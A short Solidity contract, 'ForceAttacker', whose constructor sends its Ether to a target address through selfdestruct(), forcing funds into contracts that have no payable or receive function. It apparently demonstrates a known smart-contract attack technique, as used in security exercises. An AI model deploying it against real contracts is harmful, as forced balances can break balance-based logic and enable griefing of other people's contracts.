// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title ForceAttacker
 * @notice Contract that forces Ether into a target contract using selfdestruct()
 * This bypasses any lack of payable functions or receive() in the target
 */
contract ForceAttacker {
    constructor(address payable target) payable {
        require(msg.value > 0, "Must send some Ether");
        selfdestruct(target);
    }
}
